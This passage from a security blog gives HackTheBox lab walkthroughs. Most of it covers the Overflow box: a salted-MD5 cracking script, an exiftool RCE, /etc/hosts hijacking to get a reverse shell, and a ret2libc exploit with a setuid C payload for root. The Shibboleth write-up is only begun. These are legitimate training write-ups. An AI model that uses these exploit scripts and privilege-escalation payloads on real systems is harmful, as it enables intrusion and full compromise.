      <td>c6c6b9310e0e6f3eb3ffeb2baff12fdd</td>
    </tr>
    <tr>
      <td> </td>
      <td>editor</td>
      <td>e3d748d58b58657bfa4dffe2def0b1c7</td>
    </tr>
  </tbody>
</table>

<p>Feeding these 2 hashes to <code class="language-plaintext highlighter-rouge">john</code>, I was unable to crack any using <code class="language-plaintext highlighter-rouge">rockyou.txt</code>. This is probably just a rabbit hole, or the hashes could be salted. So I tried using the <code class="language-plaintext highlighter-rouge">--file-read</code> flag of <code class="language-plaintext highlighter-rouge">sqlmap</code> to see if I can read local files, and I couldn’t.</p>

<p>I dumped the whole database using <code class="language-plaintext highlighter-rouge">sqlmap</code> and start going through the records locally in hope of finding something. Searching for the domain name in the records dumped by <code class="language-plaintext highlighter-rouge">sqlmap</code>, I found one;</p>

<p><img src="/assets/img/20220219114511.png" alt="" /></p>

<p>Going to the page, I got another login form;</p>

<p><img src="/assets/img/20220219114720.png" alt="" /></p>

<p>After a lot of digging, I found a hex-encoded string that could be a salt in the table <code class="language-plaintext highlighter-rouge">cms_siteprefs</code>(<em>mask</em> is another name for a salt);</p>

<p><img src="/assets/img/20220219115141.png" alt="" /></p>

<p>I was unable to get <code class="language-plaintext highlighter-rouge">john</code> to work with the hash, so I wrote a simple script;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>


<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[-] Usage: %s &lt;hash&gt; &lt;salt&gt; &lt;wordlist&gt;"</span> <span class="o">%</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
  <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">wordlist</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">wordlist</span><span class="p">):</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[-] Invalid wordlist: "</span> <span class="o">+</span> <span class="n">wordlist</span><span class="p">)</span>
  <span class="nb">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">wordlist</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[*] Bruteforcing hash..."</span><span class="p">);</span>
<span class="nb">hash</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">salt</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="n">word</span> <span class="o">=</span> <span class="n">wordlist</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="n">word</span><span class="p">:</span> <span class="c1"># Wordlist exhausted.
</span>    <span class="k">break</span>
  <span class="n">word</span> <span class="o">=</span> <span class="n">word</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
  <span class="k">if</span> <span class="n">md5</span><span class="p">(</span><span class="n">salt</span> <span class="o">+</span> <span class="n">word</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="nb">hash</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Success: "</span> <span class="o">+</span> <span class="n">word</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[-] Unable to crack!"</span><span class="p">)</span>
<span class="nb">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I saved the above as <code class="language-plaintext highlighter-rouge">md5-salt-brute.py</code>, and ran it. I was able to crack the hash of the user <strong>editor</strong>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>agent47@debian:<span class="nv">$ </span><span class="nb">cat </span>hashes.john    
admin:c6c6b9310e0e6f3eb3ffeb2baff12fdd   
editor:e3d748d58b58657bfa4dffe2def0b1c7
admin<span class="o">(</span>overflow<span class="o">)</span>:c71d60439ed5590b3c5e99d95ed48165
agent47@debian:<span class="nv">$ </span>./md5-salt-brute.py c6c6b9310e0e6f3eb3ffeb2baff12fdd 6c2d17f37e226486 /wordlists/rockyou.txt                                
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bruteforcing hash...                   
<span class="o">[</span>-] Unable to crack!                
agent47@debian:<span class="nv">$ </span>./md5-salt-brute.py e3d748d58b58657bfa4dffe2def0b1c7 6c2d17f37e226486 /wordlists/rockyou.txt                                
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bruteforcing hash...        
<span class="o">[</span>+] Success: alpha!@#<span class="nv">$%</span>bravo                 
agent47@debian:<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This is the only hash I could crack, but it gave me access to <strong>devbuild-job.overflow.htb</strong>;</p>

<p><img src="/assets/img/20220219124740.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="devbuild-joboverflowhtb">devbuild-job.overflow.htb</h3>
<p><br /></p>

<p>Almost all the links in the dashboard are dead. The profile page has a form that allows users to upload a <em>resume</em>;</p>

<p><img src="/assets/img/20220223084146.png" alt="" /></p>

<p>Uploading a .png file, which is not part of the listed formats, gave a <strong>File Type Not supported</strong> error that appeared only briefly.</p>

<p>Playing with the request in burp’s repeater, I found out the web application may be depending on the file extension for validation, as changing the upload file name of a .png file succeeded, and showed what looks like an output of <code class="language-plaintext highlighter-rouge">exiftool</code>, along with the path the files are uploaded to;</p>

<p><img src="/assets/img/20220223085028.png" alt="" /></p>

<p>Exiftool has an RCE vulnerability tracked as <strong>CVE-2021-22204</strong>, and there is a PoC in the GitHub repo https://github.com/convisolabs/CVE-2021-22204-exiftool. Using it, I was able to spawn a shell on the box as <strong>www-data</strong>;</p>

<p><img src="/assets/img/20220223085941.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="user">User</h3>
<p><br /></p>

<p>Inside the box as <strong>www-data</strong>, I found two local users; <strong>developer</strong>, and <strong>tester</strong>. The user <strong>tester</strong> is the one that hold the user flag. The configuration files of the site <strong>devbuild-job.overflow.htb</strong> has a MySQL credential;</p>

<p><img src="/assets/img/20220223090438.png" alt="" /></p>

<p>The password is not reused by any of the local users. The main site <strong>overflow.htb</strong> also has a MySQL credential;</p>

<p><img src="/assets/img/20220223090806.png" alt="" /></p>

<p>Testing this password against the local user account of <strong>developer</strong> worked, and I was able to login over SSH;</p>

<p><img src="/assets/img/20220223091047.png" alt="" /></p>

<p><br /></p>

<h4 id="developer">Developer</h4>
<p><br /></p>

<p>The user does not have any <code class="language-plaintext highlighter-rouge">sudo</code> permissions, but they belong to a group called <strong>network</strong>. Searching for files that belong to this group, I got one very interesting match;</p>

<p><img src="/assets/img/20220223092838.png" alt="" /></p>

<p>I have write permissions on a very important file. If I can find any service that’s making some requests to a hostname, I can edit the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file so that the hostname resolves to an address I control.</p>

<p>So I uploaded <code class="language-plaintext highlighter-rouge">pspy</code> to the box, and it picked up a download using <code class="language-plaintext highlighter-rouge">curl</code> for a shell script on the site <strong>taskmanage.overflow.htb</strong>;</p>

<p><img src="/assets/img/20220223094110.png" alt="" /></p>

<p>So I created a file named <code class="language-plaintext highlighter-rouge">task.sh</code> with a reverse shell payload on my box, and hosted it using python’s <code class="language-plaintext highlighter-rouge">http.server</code> module. I then edited the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file on the box and mapped the domain <strong>taskmanage.overflow.htb</strong> to my IP;</p>

<p><img src="/assets/img/20220223094534.png" alt="" /></p>

<p>After a few seconds, the file was downloaded from my attack box, and executed, which gave me access to the box as <strong>tester</strong>;</p>

<p><img src="/assets/img/20220223094835.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>I cannot view <code class="language-plaintext highlighter-rouge">sudo</code> permission for the user <strong>tester</strong> as I still don’t have their password, and the user does not belong to any other group.</p>

<p>Going through the filesystem, I found a SUID binary at <code class="language-plaintext highlighter-rouge">/opt/file_encrypt</code>;</p>

<p><img src="/assets/img/20220223095648.png" alt="" /></p>

<p>Running the binary, I was prompted for a PIN;</p>

<p><img src="/assets/img/20220223095808.png" alt="" /></p>

<p>So I shipped the binary to my attack box for analysis.</p>

<p><br /></p>

<h4 id="analysis-file_encrypt">Analysis: file_encrypt</h4>
<p><br /></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre>agent47@debian:<span class="nv">$ </span>rabin2 <span class="nt">-I</span> file_encrypt 
<span class="nb">arch     </span>x86
baddr    0x0
binsz    10741
bintype  elf
bits     32
canary   <span class="nb">false
</span>class    ELF32
compiler GCC: <span class="o">(</span>Ubuntu 7.5.0-3ubuntu1~18.04<span class="o">)</span> 7.5.0
crypto   <span class="nb">false
</span>endian   little
havecode <span class="nb">true
</span>intrp    /lib/ld-linux.so.2
laddr    0x0
lang     c
linenum  <span class="nb">true
</span>lsyms    <span class="nb">true
</span>machine  Intel 80386
nx       <span class="nb">true
</span>os       linux
pic      <span class="nb">true
</span>relocs   <span class="nb">true
</span>relro    full
rpath    NONE
sanitize <span class="nb">false
</span>static   <span class="nb">false
</span>stripped <span class="nb">false
</span>subsys   linux
va       <span class="nb">true</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">main</code> function is calling <code class="language-plaintext highlighter-rouge">check_pin()</code>, which is likely the function doing PIN validation;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>[0x00000b62]&gt; pdf
╭ 46: int main (char **argv);
│           ; arg char **argv @ esp+0x14
│           0x00000b62      8d4c2404       lea ecx, [argv]
│           0x00000b66      83e4f0         and esp, 0xfffffff0
│           0x00000b69      ff71fc         push dword [ecx - 4]
│           0x00000b6c      55             push ebp
│           0x00000b6d      89e5           mov ebp, esp
│           0x00000b6f      51             push ecx
│           0x00000b70      83ec04         sub esp, 4
│           0x00000b73      e818000000     call sym.__x86.get_pc_thunk.ax
│           0x00000b78      0528240000     add eax, 0x2428
│           0x00000b7d      e82effffff     call sym.check_pin
│           0x00000b82      b800000000     mov eax, 0
│           0x00000b87      83c404         add esp, 4
│           0x00000b8a      59             pop ecx
│           0x00000b8b      5d             pop ebp
│           0x00000b8c      8d61fc         lea esp, [ecx - 4]
╰           0x00000b8f      c3             ret
[0x00000b62]&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Disassembly of <code class="language-plaintext highlighter-rouge">sym.check_pin</code>;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
</pre></td><td class="rouge-code"><pre>[0x56602ab0]&gt; pdf                                                                                                                     
            ; CALL XREF from main @ 0x56602b7d
╭ 178: sym.check_pin ();
│           ; var int32_t var_28h @ ebp-0x28
│           ; var int32_t var_14h @ ebp-0x14                                                                                          
│           ; var uint32_t var_10h @ ebp-0x10                                                                                         
│           ; var int32_t var_ch @ ebp-0xc
│           ; var int32_t var_4h @ ebp-0x4
│           0x56602ab0      55             push ebp
│           0x56602ab1      89e5           mov ebp, esp
│           0x56602ab3      53             push ebx
│           0x56602ab4      83ec24         sub esp, 0x24                                                                              
│           0x56602ab7      e864fcffff     call sym.__x86.get_pc_thunk.bx                                                             
│           0x56602abc      81c3e4240000   add ebx, 0x24e4
│           0x56602ac2      e8e9fbffff     call sym.imp.rand           ; int rand(void)                                               
│           0x56602ac7      8945f4         mov dword [ebp - 0xc], eax                                                                 
│           0x56602aca      83ec0c         sub esp, 0xc                                                                               
│           0x56602acd      ff75f4         push dword [ebp - 0xc]                                                                     
│           0x56602ad0      e848fdffff     call sym.random             ; uint32_t random(void)                                        
│           0x56602ad5      83c410         add esp, 0x10
│           0x56602ad8      8945f0         mov dword [ebp - 0x10], eax                                                                
│           0x56602adb      83ec08         sub esp, 8
│           0x56602ade      ff75f4         push dword [ebp - 0xc]
│           0x56602ae1      8d8358ddffff   lea eax, [ebx - 0x22a8]                                                                    
│           0x56602ae7      50             push eax                    ; const char *format                                           
│           0x56602ae8      e8f3faffff     call sym.imp.printf         ; int printf(const char *format)                               
│           0x56602aed      83c410         add esp, 0x10
│           0x56602af0      83ec08         sub esp, 8
│           0x56602af3      8d45ec         lea eax, [ebp - 0x14]
│           0x56602af6      50             push eax
│           0x56602af7      8d837dddffff   lea eax, [ebx - 0x2283]
│           0x56602afd      50             push eax                    ; const char *format
│           0x56602afe      e8bdfbffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x56602b03      83c410         add esp, 0x10
│           0x56602b06      8b45ec         mov eax, dword [ebp - 0x14]
│           0x56602b09      3945f0         cmp dword [ebp - 0x10], eax
│       ╭─&lt; 0x56602b0c      753c           jne 0x56602b4a
│       │   0x56602b0e      83ec0c         sub esp, 0xc
│       │   0x56602b11      8d8380ddffff   lea eax, [ebx - 0x2280]
│       │   0x56602b17      50             push eax                    ; const char *format
│       │   0x56602b18      e8c3faffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x56602b1d      83c410         add esp, 0x10
│       │   0x56602b20      83ec08         sub esp, 8
│       │   0x56602b23      8d45d8         lea eax, [ebp - 0x28]
│       │   0x56602b26      50             push eax
│       │   0x56602b27      8d83c3dcffff   lea eax, [ebx - 0x233d]
│       │   0x56602b2d      50             push eax                    ; const char *format
│       │   0x56602b2e      e88dfbffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│       │   0x56602b33      83c410         add esp, 0x10
│       │   0x56602b36      83ec0c         sub esp, 0xc
│       │   0x56602b39      8d8388ddffff   lea eax, [ebx - 0x2278]
│       │   0x56602b3f      50             push eax                    ; const char *s
│       │   0x56602b40      e8fbfaffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x56602b45      83c410         add esp, 0x10
│      ╭──&lt; 0x56602b48      eb12           jmp 0x56602b5c
│      ││   ; CODE XREF from sym.check_pin @ 0x56602b0c
│      │╰─&gt; 0x56602b4a      83ec0c         sub esp, 0xc
│      │    0x56602b4d      8d83e3ddffff   lea eax, [ebx - 0x221d]
│      │    0x56602b53      50             push eax                    ; const char *s
│      │    0x56602b54      e8e7faffff     call sym.imp.puts           ; int puts(const char *s)
│      │    0x56602b59      83c410         add esp, 0x10
│      │    ; CODE XREF from sym.check_pin @ 0x56602b48
│      ╰──&gt; 0x56602b5c      90             nop
│           0x56602b5d      8b5dfc         mov ebx, dword [ebp - 4]
│           0x56602b60      c9             leave
╰           0x56602b61      c3             ret
[0x56602ab0]&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>There are multiple calls to <code class="language-plaintext highlighter-rouge">scanf()</code>, which is used to read input from the user. So I opened the binary in debug mode and set a breakpoint after the first call to <code class="language-plaintext highlighter-rouge">scanf()</code> at <code class="language-plaintext highlighter-rouge">0x56635b03</code>. The instruction at <code class="language-plaintext highlighter-rouge">0x56635b09</code> compares the value of <code class="language-plaintext highlighter-rouge">eax</code> (which is where the PIN we entered is stored), with the value in <code class="language-plaintext highlighter-rouge">var_10h</code> (<code class="language-plaintext highlighter-rouge">ebp - 0x10</code>);</p>

<p><img src="/assets/img/20220223104118.png" alt="" /></p>

<p>Since the comparison is with <code class="language-plaintext highlighter-rouge">eax</code>, which is a 32 bit register, I read 4 bytes from the other operand, which gave <code class="language-plaintext highlighter-rouge">0xf3e6d338</code>. Converting this to 32 bit signed integer, I got <code class="language-plaintext highlighter-rouge">-202976456</code>;</p>

<p><img src="/assets/img/20220223104835.png" alt="" /></p>

<p>This value is the valid PIN, and it was accepted by the binary;</p>

<p><img src="/assets/img/20220223105044.png" alt="" /></p>

<p>After that, we were prompted for a name, and the program printed out a message, and then exit. The way the program reads the <strong>name</strong> could be vulnerable to <em>buffer overflow</em>. The name read is stored at <code class="language-plaintext highlighter-rouge">var_28h</code> (<code class="language-plaintext highlighter-rouge">ebp - 0x28</code>);</p>

<p><img src="/assets/img/20220223111120.png" alt="" /></p>

<p>A memory address in x86 is 32 bit. Since the destination address is 40 bytes (<code class="language-plaintext highlighter-rouge">0x28</code>) bytes away from the base of the stack frame (EBP), we will be able to overwrite the saved EBP of <code class="language-plaintext highlighter-rouge">main()</code> (the caller) after writing 40 bytes, and the EIP after 44 bytes. Testing this in <code class="language-plaintext highlighter-rouge">gdb</code>, it worked as expected. The binary is vulnerable to <em>buffer overflow</em> attack;</p>

<p><img src="/assets/img/20220223111853.png" alt="" /></p>

<p>And it gets better too, because ASLR is disabled on the box;</p>

<p><img src="/assets/img/20220223203858.png" alt="" /></p>

<p><br /></p>

<h4 id="exploitation-ret2libc">Exploitation: ret2libc</h4>
<p><br /></p>

<p>The binary has a non-executable stack (NX/DEP), so this won’t be as simple as loading shellcode into the stack, and jumping to it. An exploitation technique that can be used to get around this is <strong>return to libc</strong> (ret2libc) attack. This attack works by overwriting the EIP with the address of a function in the libc library (like <code class="language-plaintext highlighter-rouge">system</code> or <code class="language-plaintext highlighter-rouge">execv</code>), and passing it an argument we control (like the address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> string in the libc library). This works because no code is executed on the stack.</p>

<p>To exploit this, I need to write <strong>44</strong> bytes of padding, followed by the address of <code class="language-plaintext highlighter-rouge">execv()</code> to overwrite the EIP. followed by the address of <code class="language-plaintext highlighter-rouge">exit()</code> which will be the return address for clean exit, and then followed by the address of a string containing the full path of the binary I wished to execute. I used <code class="language-plaintext highlighter-rouge">execv()</code> because unlike <code class="language-plaintext highlighter-rouge">system()</code>, it does not drop privileges when spawning a new process.</p>

<p>The first step is figuring out the address of <code class="language-plaintext highlighter-rouge">execv()</code>, <code class="language-plaintext highlighter-rouge">exit()</code>, and the environment variable <code class="language-plaintext highlighter-rouge">PAYLOAD</code> (which I set to the path of my reverse shell). For this, I wrote a simple C program;</p>

<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

int main(){

  printf("Addr of system():   0x%08x\n", &amp;execv);
  printf("Addr of exit():     0x%08x\n", &amp;exit);
  printf("Addr of $PAYLOAD:   0x%08x\n", getenv("PAYLOAD"));
  
  return 0;
}
</code></pre>

<p>Notice how the address of <code class="language-plaintext highlighter-rouge">$PAYLOAD</code> changes based on the length of the filename;</p>

<p><img src="/assets/img/20220225070759.png" alt="" /></p>

<p>We need to account for this when calling the binary at <code class="language-plaintext highlighter-rouge">/opt/file_encrypt/file_encrypt</code>. Since it is 30 characters long, I renamed the address dumper to <code class="language-plaintext highlighter-rouge">/dev/shm/dump_addrssssssssssss</code>. This will give me the correct address of <code class="language-plaintext highlighter-rouge">$PAYLOAD</code> when calling <code class="language-plaintext highlighter-rouge">/opt/file_encrypt/file_encrypt</code>. We now have our valid addresses;</p>

<p><img src="/assets/img/20220225070932.png" alt="" /></p>

<p>Using python, I built a simple <em>ret2libc</em> payload;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python2
</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">44</span>

<span class="n">execv</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xf7ea8730</span><span class="p">)</span>
<span class="nb">exit</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xf7e194b0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xffffdf44</span><span class="p">)</span>

<span class="k">print</span> <span class="s">"-202976456"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="n">execv</span> <span class="o">+</span> <span class="nb">exit</span> <span class="o">+</span> <span class="n">payload</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<p>I generated the buffer and saved it in my web directory;</p>

<p><img src="/assets/img/20220225071253.png" alt="" /></p>

<p>On the remote host, I set <code class="language-plaintext highlighter-rouge">PAYLOAD</code> to <code class="language-plaintext highlighter-rouge">/dev/shm/payload</code>, where payload is a shell script containing a simple bash reverse shell. The exploit worked, but I got a shell as my current user. The privileges were dropped;</p>

<p><img src="/assets/img/20220225071317.png" alt="" /></p>

<p><img src="/assets/img/20220225071333.png" alt="" /></p>

<p>So I wrote a simple C payload that will elevate to higher privileges using <code class="language-plaintext highlighter-rouge">setuid()</code> and <code class="language-plaintext highlighter-rouge">setgid()</code> before calling my reverse shell;</p>

<pre><code class="language-C">#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;

int main(){

  setuid(0);
  setgid(0);
  char *args[] = {"revshell.sh", NULL};
  execv("/dev/shm/revshell.sh", args);
  return 0;
}
</code></pre>

<p>I compiled and pushed the program to <code class="language-plaintext highlighter-rouge">/dev/shm/payload</code>, which is the value in my <code class="language-plaintext highlighter-rouge">$PAYLOAD</code> variable. Running the exploit again, I got a shell on the box as <strong>root</strong>;</p>

<p><img src="/assets/img/20220225072928.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Discovered port <strong>22</strong>, <strong>25</strong>, and <strong>80</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found an open signup on the website, and created a test account.</li>
  <li>Identified a possible username <strong>admin</strong> that exist on the website.</li>
  <li>Used <em>Oracle Padding</em> attack to craft a cookie that gave access to the account of <strong>admin</strong>
    <ul>
      <li>Found an SQL injection vulnerability in <code class="language-plaintext highlighter-rouge">/home/logs.php</code></li>
      <li>Used <code class="language-plaintext highlighter-rouge">sqlmap</code> to dump some hashes, and discovered the domain <strong>devbuild-job.overflow.htb</strong></li>
      <li>Gained access to the domain by cracking the salted hash of the user <strong>editor</strong></li>
    </ul>
  </li>
  <li><strong>devbuild-job.overflow.htb</strong>
    <ul>
      <li>Found a file upload form that is passed to <code class="language-plaintext highlighter-rouge">exiftool</code>.</li>
      <li>Exploited <strong>CVE-2021-22204</strong> to gain code execution as <strong>www-data</strong></li>
    </ul>
  </li>
  <li>Inside as <strong>www-data</strong>
    <ul>
      <li>Found 2 local users; <strong>developer</strong>, and <strong>tester</strong> (holds <code class="language-plaintext highlighter-rouge">user.txt</code>)</li>
      <li>Recovered MySQL credentials in config files of <strong>devbuild-job.overflow.htb</strong> domain.</li>
      <li>Gained access to account of <strong>developer</strong> due to password reuse.</li>
    </ul>
  </li>
  <li>Inside as <strong>developer</strong>
    <ul>
      <li>Identified a write access to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></li>
      <li><code class="language-plaintext highlighter-rouge">pspy</code> showed requests to <code class="language-plaintext highlighter-rouge">http://taskmanage.overflow.htb/task.sh</code>, which I hijacked by editing the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file to gain code execution as <strong>tester</strong></li>
    </ul>
  </li>
  <li>Inside as <strong>tester</strong>
    <ul>
      <li>Found a SUID binary at <code class="language-plaintext highlighter-rouge">/opt/file_encrypt/file_encrypt</code></li>
      <li>Binary is protected by a PIN.</li>
      <li>Reversed the binary using <code class="language-plaintext highlighter-rouge">radare2</code> to extract the PIN.</li>
      <li>Identified a <em>buffer overflow</em> vulnerability in the binary.</li>
      <li>Performed a <em>ret2libc</em> attack to gain code execution as <strong>root</strong></li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="hard" /><category term="web" /><category term="smtp" /><category term="oracle padding" /><category term="padbuster" /><category term="execute after redirect" /><category term="sql injection" /><category term="sqlmap" /><category term="john" /><category term="python" /><category term="exiftool" /><category term="reverse engineering" /><category term="binary exploitation" /><category term="ret2libc" /><category term="nx" /><category term="radare2" /><summary type="html"><![CDATA[Overflow is an amazing hard-rated box on HackTheBox. To gain a foothold on the box, you will need to exploit an oracle padding vulnerability to gain access to an admin dashboard that’s vulnerable to SQL injection, use the SQL injection to retrieve and crack a hash for another domain, which is vulnerable to an exiftool RCE.]]></summary></entry><entry><title type="html">Shibboleth - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/shibboleth.html" rel="alternate" type="text/html" title="Shibboleth - HackTheBox" /><published>2022-04-02T00:00:00+01:00</published><updated>2022-04-02T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/shibboleth</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/shibboleth.html"><![CDATA[<p><strong>Shibboleth</strong> is a relatively easy medium linux box. It’s running an instance of <em>Zabbix</em> which you can identify by bruteforcing for hidden subdomains. Once discovered, you need to exploit an ASF-RMCP/IPMI service running on UDP port <strong>623</strong> to extract and crack the hash of an administrator, which will give you access to the Zabbix dashboard. The box itself is configured as a Zabbix agent, so you can use this to gain code execution. Once inside, you will be moving laterally to another user through password reuse, and gain root access to the box thanks to a vulnerable MySQL service.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20211113204711.png" alt="" /></p>

<p><img src="/assets/img/20211113204757.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Sat Nov 13 20:49:39 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.124
Nmap scan report for shibboleth.htb (10.10.11.124)
Host is up (0.24s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: FlexStart Bootstrap Template - Index

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 13 20:50:24 2021 -- 1 IP address (1 host up) scanned in 45.09 seconds
</code></pre>

<h4 id="web">Web</h4>

<p><img src="/assets/img/20211113205454.png" alt="" /></p>

<p>Attempt to send an email using the contact-us form showed an error;</p>

<p><img src="/assets/img/20211113211043.png" alt="" /></p>

<p>Bruteforcing for subdomains with <code class="language-plaintext highlighter-rouge">ffuf</code> discovered 3;</p>

<p><img src="/assets/img/20211113210249.png" alt="" /></p>

<p>All the three subdomains show the same page;</p>

<p><img src="/assets/img/20211113210547.png" alt="" /></p>

<p>Hovering on the <em>help</em> link below the login form showed a URL to an online documentation that revealed the version number of <em>Zabbix</em>, which is <strong>5.0</strong>. Googling revealed a couple of vulnerabilities that require no authentication, but none of the ones I tested worked.</p>

<p>I was stuck at this for quite a while before remembering to do a UDP scan on the host. This is something I always completely forget to do, which should have been obvious since NMAP only discovered one TCP port on the target. Running <code class="language-plaintext highlighter-rouge">nmap</code> in UDP mode, I got a hit;</p>

<p><img src="/assets/img/20211114120214.png" alt="" /></p>

<p>Service scan with <code class="language-plaintext highlighter-rouge">nmap</code> identified it as <em>asf-rmcp</em>, which according to <em>Tenable</em>, is;</p>

<blockquote>
  <p>ASF is a DMTF standard that provides a remote control and alerting interface between management consoles and ASF-aware hosts. RMCP is <strong>a network protocol used by a management console to remotely control an ASF-aware</strong> host.</p>
</blockquote>
